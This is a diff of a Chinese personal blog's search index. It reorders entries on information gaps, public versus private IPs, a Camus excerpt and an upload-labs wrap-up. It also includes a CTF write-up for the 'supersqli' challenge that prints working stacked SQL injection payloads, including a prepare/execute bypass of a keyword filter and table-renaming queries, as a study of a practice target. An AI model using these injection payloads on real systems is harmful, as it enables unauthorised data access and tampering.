-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
-]]></content>
-      <categories>
-        <category>upload-labs</category>
-      </categories>
-      <tags>
-        <tag>upload-labs</tag>
       </tags>
   </entry>
   <entry>
@@ -5644,33 +5741,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>世界的参差</title>
-    <url>/2023/03/23/%E4%B8%96%E7%95%8C%E7%9A%84%E5%8F%82%E5%B7%AE/</url>
-    <content><![CDATA[<p><img src="/images/ocean.png" alt="world"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>乱花渐欲迷人眼，表象无言惑人心。</p>
-<h1 id="信息差"><a href="#信息差" class="headerlink" title="信息差"></a>信息差</h1><p>最近用搜索引擎找电子书找不到想要的，通过其它方式一下子就找到了。在官方平台上点麦当劳却比某平台上贵十余元。想说说关于信息差的事。</p>
-<p>信息差的例子随处可见，其中著名的一个例子是罗斯柴尔德利用滑铁卢战役的信息差谋取暴利的故事。信息差也被广泛利用，有人靠信息差就能养活自己，有人靠信息差混淆视听。身处互联网时代，网上的信息过于庞杂和碎片化，很难辨别真假和质量。同时，互联网也会根据用户的喜好和习惯，推送相似或者相符的信息，导致用户陷入信息茧房，无法接触到更多元和更广的信息。因此，互联网并没有让人们更加平等和智慧，而是让人们更加孤立和愚昧。</p>
-<p>世界的参差不是第18层地狱与第1层地狱的区别，是地狱与天堂的区别。</p>
-<h1 id="信息的高低"><a href="#信息的高低" class="headerlink" title="信息的高低"></a>信息的高低</h1><p>信息有高低之分，信息的质量会影响我们的认知和决策。如何获取更好的信息，我有几点想法：</p>
-<ol>
-<li>找到源头或接近源头的消息。确保消息传递过程中不会被加工或是扭曲。</li>
-<li>广泛获取信息来源，多方得到信息渠道，留下值得信赖的信息源。</li>
-<li>对于私人公布的信息，很多时候无从考据，但一般更有价值。需要谨慎分辨。</li>
-<li>很多消息本身并不重要，重要的是背后的目的和趋势。</li>
-<li>通常意义上，知道这个信息的人越少，这个信息的在某方面的价值越高。</li>
-</ol>
-<h1 id="表象"><a href="#表象" class="headerlink" title="表象"></a>表象</h1><p>很显然，表象泛滥于世界。无法否认的是，大部分人都沉浸于表象之中，这注定了能够看到背后本质的人会很少。表象如同世界的岩浆幻想，人们只是见到其通红便想象它的炽热，只是见到它的通红便不愿深究其内在。</p>
-<h1 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h1><p>本质是世界运行的规则，知其然更知其所以然，我们只需要知道世界运行的本质，就能从一个个表象中脱离，省去大量无意义的重复活动，提高效率，在更短时间内做更多事。</p>
-]]></content>
-      <categories>
-        <category>随想</category>
-      </categories>
-      <tags>
-        <tag>随想</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs_5-10</title>
     <url>/2022/11/25/upload-labs_5-10/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p>
@@ -5700,6 +5770,33 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>upload-labs</tag>
         <tag>蚁剑</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>世界的参差</title>
+    <url>/2023/03/23/%E4%B8%96%E7%95%8C%E7%9A%84%E5%8F%82%E5%B7%AE/</url>
+    <content><![CDATA[<p><img src="/images/ocean.png" alt="world"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>乱花渐欲迷人眼，表象无言惑人心。</p>
+<h1 id="信息差"><a href="#信息差" class="headerlink" title="信息差"></a>信息差</h1><p>最近用搜索引擎找电子书找不到想要的，通过其它方式一下子就找到了。在官方平台上点麦当劳却比某平台上贵十余元。想说说关于信息差的事。</p>
+<p>信息差的例子随处可见，其中著名的一个例子是罗斯柴尔德利用滑铁卢战役的信息差谋取暴利的故事。信息差也被广泛利用，有人靠信息差就能养活自己，有人靠信息差混淆视听。身处互联网时代，网上的信息过于庞杂和碎片化，很难辨别真假和质量。同时，互联网也会根据用户的喜好和习惯，推送相似或者相符的信息，导致用户陷入信息茧房，无法接触到更多元和更广的信息。因此，互联网并没有让人们更加平等和智慧，而是让人们更加孤立和愚昧。</p>
+<p>世界的参差不是第18层地狱与第1层地狱的区别，是地狱与天堂的区别。</p>
+<h1 id="信息的高低"><a href="#信息的高低" class="headerlink" title="信息的高低"></a>信息的高低</h1><p>信息有高低之分，信息的质量会影响我们的认知和决策。如何获取更好的信息，我有几点想法：</p>
+<ol>
+<li>找到源头或接近源头的消息。确保消息传递过程中不会被加工或是扭曲。</li>
+<li>广泛获取信息来源，多方得到信息渠道，留下值得信赖的信息源。</li>
+<li>对于私人公布的信息，很多时候无从考据，但一般更有价值。需要谨慎分辨。</li>
+<li>很多消息本身并不重要，重要的是背后的目的和趋势。</li>
+<li>通常意义上，知道这个信息的人越少，这个信息的在某方面的价值越高。</li>
+</ol>
+<h1 id="表象"><a href="#表象" class="headerlink" title="表象"></a>表象</h1><p>很显然，表象泛滥于世界。无法否认的是，大部分人都沉浸于表象之中，这注定了能够看到背后本质的人会很少。表象如同世界的岩浆幻想，人们只是见到其通红便想象它的炽热，只是见到它的通红便不愿深究其内在。</p>
+<h1 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h1><p>本质是世界运行的规则，知其然更知其所以然，我们只需要知道世界运行的本质，就能从一个个表象中脱离，省去大量无意义的重复活动，提高效率，在更短时间内做更多事。</p>
+]]></content>
+      <categories>
+        <category>随想</category>
+      </categories>
+      <tags>
+        <tag>随想</tag>
       </tags>
   </entry>
   <entry>
@@ -6017,6 +6114,29 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>判断一个IP是否为公网IP</title>
+    <url>/2023/03/11/%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AAIP%E6%98%AF%E5%90%A6%E4%B8%BA%E5%85%AC%E7%BD%91IP/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时需要一个公网ip，但是不知道自己的IP是否为公网IP，由于老是会忘掉怎么判断，不如自己记录一下。</p>
+<span id="more"></span>
+<h1 id="IP之间的区别"><a href="#IP之间的区别" class="headerlink" title="IP之间的区别"></a>IP之间的区别</h1><p>内网IP：只能在限定区域内访问，外网无法识别。<br>大内网IP：假设是联通带宽，则分配IP只能在联通内访问，移动电信网络均无法访问。<br>公网IP：全球唯一IP地址，在任何地方均可访问。</p>
+<h1 id="Tips-1-IP地址范围"><a href="#Tips-1-IP地址范围" class="headerlink" title="Tips 1:IP地址范围"></a>Tips 1:IP地址范围</h1><p>以下IP段范围均为私网IP地址：</p>
+<ol>
+<li>10.0.0.0-10.255.255.255</li>
+<li>192.168.0.0-192.168.255.255</li>
+<li>172.16.0.0-172.31.255.255</li>
+</ol>
+<h1 id="Tips-2-咨询网络服务商"><a href="#Tips-2-咨询网络服务商" class="headerlink" title="Tips 2:咨询网络服务商"></a>Tips 2:咨询网络服务商</h1><p>如果不确定自身IP是否为公网IP，那么可以咨询客服。<br>如果确定不是公网IP，那么向客服要求开通公网IP。</p>
+<h1 id="Tips-3-IP对比法"><a href="#Tips-3-IP对比法" class="headerlink" title="Tips 3:IP对比法"></a>Tips 3:IP对比法</h1><p>首先查看自身IP：使用cmd的ipconfig&#x2F;all命令，查看正在连接的ipv4地址。<br>然后在<a href="https://www.whatismyip.com/">whatismyip</a> 或 <a href="https://www.ipchicken.com/">ipchicken</a> 查看IP，比对是否一致。<br>如果一致，则说明IP为公网ip，否则不是。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>物以稀为贵，公网IP更好，但也要看自身需求。</p>
+]]></content>
+      <categories>
+        <category>IP</category>
+      </categories>
+      <tags>
+        <tag>IP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网穿透之隧道通信</title>
     <url>/2023/03/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>蜗牛学院的内网穿透之隧道通信课程笔记。</p>
@@ -6074,29 +6194,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>隧道通信</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>判断一个IP是否为公网IP</title>
-    <url>/2023/03/11/%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AAIP%E6%98%AF%E5%90%A6%E4%B8%BA%E5%85%AC%E7%BD%91IP/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时需要一个公网ip，但是不知道自己的IP是否为公网IP，由于老是会忘掉怎么判断，不如自己记录一下。</p>
-<span id="more"></span>
-<h1 id="IP之间的区别"><a href="#IP之间的区别" class="headerlink" title="IP之间的区别"></a>IP之间的区别</h1><p>内网IP：只能在限定区域内访问，外网无法识别。<br>大内网IP：假设是联通带宽，则分配IP只能在联通内访问，移动电信网络均无法访问。<br>公网IP：全球唯一IP地址，在任何地方均可访问。</p>
-<h1 id="Tips-1-IP地址范围"><a href="#Tips-1-IP地址范围" class="headerlink" title="Tips 1:IP地址范围"></a>Tips 1:IP地址范围</h1><p>以下IP段范围均为私网IP地址：</p>
-<ol>
-<li>10.0.0.0-10.255.255.255</li>
-<li>192.168.0.0-192.168.255.255</li>
-<li>172.16.0.0-172.31.255.255</li>
-</ol>
-<h1 id="Tips-2-咨询网络服务商"><a href="#Tips-2-咨询网络服务商" class="headerlink" title="Tips 2:咨询网络服务商"></a>Tips 2:咨询网络服务商</h1><p>如果不确定自身IP是否为公网IP，那么可以咨询客服。<br>如果确定不是公网IP，那么向客服要求开通公网IP。</p>
-<h1 id="Tips-3-IP对比法"><a href="#Tips-3-IP对比法" class="headerlink" title="Tips 3:IP对比法"></a>Tips 3:IP对比法</h1><p>首先查看自身IP：使用cmd的ipconfig&#x2F;all命令，查看正在连接的ipv4地址。<br>然后在<a href="https://www.whatismyip.com/">whatismyip</a> 或 <a href="https://www.ipchicken.com/">ipchicken</a> 查看IP，比对是否一致。<br>如果一致，则说明IP为公网ip，否则不是。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>物以稀为贵，公网IP更好，但也要看自身需求。</p>
-]]></content>
-      <categories>
-        <category>IP</category>
-      </categories>
-      <tags>
-        <tag>IP</tag>
       </tags>
   </entry>
   <entry>
@@ -6213,25 +6310,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>局外人-摘抄</title>
-    <url>/2023/03/23/%E5%B1%80%E5%A4%96%E4%BA%BA-%E6%91%98%E6%8A%84%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p><img src="/images/night2.png" alt="night"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日偶然间，因不想学习，读完了加缪的《局外人》这本书。慕名已久，读了大概两三小时。</p>
-<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>他说他一直在研究我的灵魂，结果发现其中空虚无物。他说我实际上没有灵魂，没有丝毫人性，没有任何一条在人类灵魂中占神圣地位的道德原则，所有这些都与我格格不入。</p>
-<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>这时，不知是为什么，好像我身上有什么东西爆裂开来，我扯着嗓子直嚷，我叫他不要为我祈祷，我抓住他长袍的领子，把我内心深处的喜怒哀乐猛地一股脑儿倾倒在他头上。他的神气不是那么确信有把握吗？但他的确信不值女人的一根头发，他甚至连自己是否活着都没有把握，因为他干脆就像行尸走肉。而我，我好像是两手空空，一无所有，但我对自己很有把握，对我所有的一切都有把握，比他有把握得多，对我的生命，对我即将来到的死亡，都有把握。是的，我只有这份把握，但至少我掌握了这个真理，正如这个真理抓住了我一样。我以前有理，现在有理，将来永远有理。我以这种方式生活过，我也可能以另外一种方式生活。我干过这，没有干过那，我做过这样的事，而没有做过那样的事。而以后呢？似乎我过去一直等待的就是这一分钟，就是我也许会被判无罪的黎明。没有任何东西，没有任何东西是有重要性的，我很明白是为什么。他也知道是为什么。在我所度过的整个那段荒诞生活期间，一种阴暗的气息从我未来前途的深处向我扑面而来，它穿越了尚未来到的岁月，所到之处，使人们曾经向我建议的所有一切彼此之间不再有高下优劣的差别了，未来的生活也并不比我已往的生活更真切实在。其他人的死，母亲的爱，对我有什么重要？既然注定只有一种命运选中了我，而成千上万的生活幸运儿都像他这位神甫一样跟我称兄道弟，那么他们所选择的生活，他们所确定的命运，他们所尊奉的上帝，对我又有什么重要？他懂吗？大家都是幸运者，世界上只有幸运者。有朝一日，所有的其他人无一例外，都会判死刑，他自己也会被判死刑，幸免不了。这么说来，被指控杀了人，只因在母亲的葬礼上没有哭而被处决，这又有什么重要呢？沙拉玛诺的狗与他的妻子没有什么区别，那个自动机械式的小女人与马松所娶的那个巴黎女人或者希望嫁给我的玛丽，也都没有区别，个个有罪。雷蒙是不是我的同伙与塞莱斯特是不是比他更好，这有什么重要？今天，玛丽是不是又把自己的嘴唇送向另一个新默尔索，这有什么重要？他这个也被判了死刑的神甫，他懂吗？从我未来死亡的深渊里，我喊出了这些话，喊得喘不过气来。但这时，有人把神甫从我手中救了出去，看守们狠狠吓唬我。而神甫却劝他们安静下来，他默默地看了我一会儿。他眼里充满了泪水，他转过身去走开，消失掉了。</p>
-<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>而我，我现在也感到自己准备好把一切再过一遍。好像刚才这场怒火清除了我心里的痛苦，掏空了我的七情六欲一样，现在我面对着这个充满了星光与默示的夜，第一次向这个冷漠而未温情尽失的世界敞开了我的心扉。我体验到这个世界如此像我，如此友爱融洽，觉得自己过去曾经是幸福的，现在仍然是幸福的。为了善始善终，功德圆满，为了不感到自己属于另类，我期望处决我的那天，有很多人前来看热闹，他们都向我发出仇恨的叫喊声。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>圆满了。</p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>读书笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>孤独摇滚--忐忑不安的吉他英雄</title>
     <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
     <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
@@ -6259,6 +6337,25 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>孤独摇滚</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>局外人-摘抄</title>
+    <url>/2023/03/23/%E5%B1%80%E5%A4%96%E4%BA%BA-%E6%91%98%E6%8A%84%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p><img src="/images/night2.png" alt="night"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日偶然间，因不想学习，读完了加缪的《局外人》这本书。慕名已久，读了大概两三小时。</p>
+<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>他说他一直在研究我的灵魂，结果发现其中空虚无物。他说我实际上没有灵魂，没有丝毫人性，没有任何一条在人类灵魂中占神圣地位的道德原则，所有这些都与我格格不入。</p>
+<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>这时，不知是为什么，好像我身上有什么东西爆裂开来，我扯着嗓子直嚷，我叫他不要为我祈祷，我抓住他长袍的领子，把我内心深处的喜怒哀乐猛地一股脑儿倾倒在他头上。他的神气不是那么确信有把握吗？但他的确信不值女人的一根头发，他甚至连自己是否活着都没有把握，因为他干脆就像行尸走肉。而我，我好像是两手空空，一无所有，但我对自己很有把握，对我所有的一切都有把握，比他有把握得多，对我的生命，对我即将来到的死亡，都有把握。是的，我只有这份把握，但至少我掌握了这个真理，正如这个真理抓住了我一样。我以前有理，现在有理，将来永远有理。我以这种方式生活过，我也可能以另外一种方式生活。我干过这，没有干过那，我做过这样的事，而没有做过那样的事。而以后呢？似乎我过去一直等待的就是这一分钟，就是我也许会被判无罪的黎明。没有任何东西，没有任何东西是有重要性的，我很明白是为什么。他也知道是为什么。在我所度过的整个那段荒诞生活期间，一种阴暗的气息从我未来前途的深处向我扑面而来，它穿越了尚未来到的岁月，所到之处，使人们曾经向我建议的所有一切彼此之间不再有高下优劣的差别了，未来的生活也并不比我已往的生活更真切实在。其他人的死，母亲的爱，对我有什么重要？既然注定只有一种命运选中了我，而成千上万的生活幸运儿都像他这位神甫一样跟我称兄道弟，那么他们所选择的生活，他们所确定的命运，他们所尊奉的上帝，对我又有什么重要？他懂吗？大家都是幸运者，世界上只有幸运者。有朝一日，所有的其他人无一例外，都会判死刑，他自己也会被判死刑，幸免不了。这么说来，被指控杀了人，只因在母亲的葬礼上没有哭而被处决，这又有什么重要呢？沙拉玛诺的狗与他的妻子没有什么区别，那个自动机械式的小女人与马松所娶的那个巴黎女人或者希望嫁给我的玛丽，也都没有区别，个个有罪。雷蒙是不是我的同伙与塞莱斯特是不是比他更好，这有什么重要？今天，玛丽是不是又把自己的嘴唇送向另一个新默尔索，这有什么重要？他这个也被判了死刑的神甫，他懂吗？从我未来死亡的深渊里，我喊出了这些话，喊得喘不过气来。但这时，有人把神甫从我手中救了出去，看守们狠狠吓唬我。而神甫却劝他们安静下来，他默默地看了我一会儿。他眼里充满了泪水，他转过身去走开，消失掉了。</p>
+<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>而我，我现在也感到自己准备好把一切再过一遍。好像刚才这场怒火清除了我心里的痛苦，掏空了我的七情六欲一样，现在我面对着这个充满了星光与默示的夜，第一次向这个冷漠而未温情尽失的世界敞开了我的心扉。我体验到这个世界如此像我，如此友爱融洽，觉得自己过去曾经是幸福的，现在仍然是幸福的。为了善始善终，功德圆满，为了不感到自己属于另类，我期望处决我的那天，有很多人前来看热闹，他们都向我发出仇恨的叫喊声。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>圆满了。</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>读书笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -7192,6 +7289,48 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>攻防世界_supersqli</title>
+    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_supersqli/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。</p>
+<span id="more"></span>
+<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界 -&gt; supersqli</p>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>初步尝试<br><code>1&#39;</code> 出现了报错，并且根据报错信息可知，就是使用1’注入<br><code>1&#39; order by 2#</code> 可知列数为2<br><code>1&#39; union select 1,2 #</code> 发现遇到一个报错：<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>尝试大小写，双写，注释符，内联等绕过方式后均无果，于是考虑别的办法</p>
+</li>
+<li><p>堆叠注入<br>在多次尝试后，选择堆叠注入。<br><code>1&#39;;show databases; --+</code><br>成功显示数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show tables; --+</span><br><span class="line"></span><br><span class="line">成功显示表名：</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对每个表名查询字段，查询字段时需要将表名用反引号（`）括起来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `words`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从上面查询可知，我们所需的flag在表名为“1919810931114514”当中。<br>接下来就是如何获取到该字段</p>
+</li>
+<li><p>获取flag</p>
+</li>
+</ol>
+<ul>
+<li><p>方法1：预编译<br><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">预编译的知识</a><br>简单来说有三步：<br>set @xxx &#x3D; 需要查询的语句;<br>prepare stmt from @xxx;<br>execute stmt;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
+<p>即可获得flag</p>
+</li>
+<li><p>方法2：改表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure>
+<p>改好后再通过这个语句查询：<br><code>1&#39; or 1=1 #</code><br>即可获得flag</p>
+</li>
+</ul>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好好学习，天天向上</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">攻防世界-supersqli详解</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SQL注入</tag>
+        <tag>堆叠注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界_easyphp</title>
     <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p>
@@ -7239,48 +7378,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>CTF</tag>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界_supersqli</title>
-    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_supersqli/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。</p>
-<span id="more"></span>
-<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界 -&gt; supersqli</p>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>初步尝试<br><code>1&#39;</code> 出现了报错，并且根据报错信息可知，就是使用1’注入<br><code>1&#39; order by 2#</code> 可知列数为2<br><code>1&#39; union select 1,2 #</code> 发现遇到一个报错：<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>尝试大小写，双写，注释符，内联等绕过方式后均无果，于是考虑别的办法</p>
-</li>
-<li><p>堆叠注入<br>在多次尝试后，选择堆叠注入。<br><code>1&#39;;show databases; --+</code><br>成功显示数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show tables; --+</span><br><span class="line"></span><br><span class="line">成功显示表名：</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>对每个表名查询字段，查询字段时需要将表名用反引号（`）括起来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `words`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>从上面查询可知，我们所需的flag在表名为“1919810931114514”当中。<br>接下来就是如何获取到该字段</p>
-</li>
-<li><p>获取flag</p>
-</li>
-</ol>
-<ul>
-<li><p>方法1：预编译<br><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">预编译的知识</a><br>简单来说有三步：<br>set @xxx &#x3D; 需要查询的语句;<br>prepare stmt from @xxx;<br>execute stmt;</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
-<p>即可获得flag</p>
-</li>
-<li><p>方法2：改表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure>
